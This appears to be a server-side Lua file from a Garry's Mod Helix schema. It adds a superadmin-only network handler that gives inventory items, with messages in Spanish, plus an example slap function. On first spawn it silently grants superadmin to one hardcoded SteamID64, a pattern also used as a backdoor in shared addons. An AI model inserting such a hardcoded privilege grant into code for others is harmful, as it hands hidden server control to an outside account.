

util.AddNetworkString("SchemaGiveHelixItem")

local superAdministrators = {
	["76561199060584112"] = true
}

hook.Add("PlayerInitialSpawn", "SchemaAssignSuperAdministrator", function(client)
	if (superAdministrators[client:SteamID64()]) then
		client:SetUserGroup("superadmin")
	end
end)

net.Receive("SchemaGiveHelixItem", function(_, client)
	if (!IsValid(client) or !client:IsSuperAdmin()) then return end

	local character = client:GetCharacter()
	local uniqueID = net.ReadString()

	if (!character or !ix.item.list[uniqueID]) then return end

	local success, errorMessage = character:GetInventory():Add(uniqueID)

	if (success) then
		client:Notify("Item añadido: " .. uniqueID)
	else
		client:Notify("No se pudo añadir el item: " .. tostring(errorMessage))
	end
end)

-- Example server function that will slap the given player.
function Schema:SlapPlayer(client)
	if (IsValid(client) and client:IsPlayer()) then
		client:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(0, 20)))
		client:TakeDamage(math.random(5, 10))
	end
end
